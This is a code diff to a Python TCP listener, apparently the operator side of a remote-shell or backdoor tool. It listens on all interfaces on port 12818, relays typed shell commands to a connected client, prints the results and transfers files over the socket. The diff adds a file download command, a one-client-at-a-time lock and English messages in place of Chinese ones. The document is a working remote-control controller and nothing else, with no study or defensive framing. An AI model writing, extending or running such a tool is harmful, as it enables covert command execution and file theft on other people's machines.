@@ -2,9 +2,15 @@ import socket
 import subprocess
 import threading
 import os
+import time
+
+# 全局变量，用于跟踪是否已经有客户端连接
+connected_client = None
 
 def handle_client(client_socket, base_dir):
+    global connected_client
     current_dir = base_dir
+
     while True:
         try:
             # 接收客户端发送的请求（这里可以添加认证机制）
@@ -26,7 +32,7 @@ def handle_client(client_socket, base_dir):
                         if os.path.isdir(path):
                             current_dir = path
                         else:
-                            print("没有相对应的文件捏~")
+                            print("No such directory")
                         continue
                     elif command.lower().startswith('upload '):
                         # 处理上传命令
@@ -40,29 +46,48 @@ def handle_client(client_socket, base_dir):
                                     if not bytes_read:
                                         break
                                     client_socket.sendall(bytes_read)
-                            print(f"文件 {file_path} 已上传")
+                            print(f"File {file_path} uploaded.")
                         else:
-                            print("没有相对应的文件捏~")
+                            print("File not found.")
+                        continue
+                    elif command.lower().startswith('download '):
+                        # 处理下载命令
+                        file_path = command[9:]
+                        if os.path.isfile(file_path):
+                            file_size = os.path.getsize(file_path)
+                            client_socket.send(f"DOWNLOAD {file_path} {file_size}".encode('utf-8'))
+                            with open(file_path, 'rb') as f:
+                                while True:
+                                    bytes_read = f.read(4096)
+                                    if not bytes_read:
+                                        break
+                                    client_socket.sendall(bytes_read)
+                            print(f"File {file_path} downloaded.")
+                        else:
+                            print("File not found.")
                         continue
                     elif command.lower() == 'exit':
                         client_socket.send(command.encode('utf-8'))
                         break
-                    client_socket.send(command.encode('utf-8'))
-                    # 接收命令执行结果
-                    output = client_socket.recv(4096)
-                    if output:
-                        print(output.decode('utf-8', errors='ignore'))
                     else:
-                        print("没有收到输出")
+                        client_socket.send(command.encode('utf-8'))
+                        # 接收命令执行结果
+                        output = client_socket.recv(4096)
+                        if output:
+                            print(output.decode('utf-8', errors='ignore'))
+                        else:
+                            print("No output received")
             else:
-                print("无效的请求")
+                print("Invalid request")
                 break
         except Exception as e:
-            print(f"错误{e}")
+            print(f"Error: {e}")
             break
     client_socket.close()
+    connected_client = None  # 重置连接状态
 
 def main():
+    global connected_client  # Declare connected_client as global
     host = '0.0.0.0'  # 监听所有可用的接口
     port = 12818
     base_dir = os.getcwd()
@@ -70,21 +95,18 @@ def main():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((host, port))
     server.listen(5)
-    print("""
-欢迎使用脚本喵
-         .
-    ____/|
-    \ o.O|
-     |   |
-    =(_._)=
-""")
-    print(f"[*] 监听到{host}:{port}")
+    print(f"[*] Listening as {host}:{port}")
 
     while True:
         client, address = server.accept()
-        print(f"[*] {address[0]}:{address[1]}已连接")
-        client_handler = threading.Thread(target=handle_client, args=(client, base_dir))
-        client_handler.start()
+        print(f"[*] Accepted connection from {address[0]}:{address[1]}")
+        if connected_client is None:
+            connected_client = client
+            client_handler = threading.Thread(target=handle_client, args=(client, base_dir))
+            client_handler.start()
+        else:
+            print(f"[*] Another client is already connected. Closing connection from {address[0]}:{address[1]}")
+            client.close()
 
 if __name__ == '__main__':
     main()
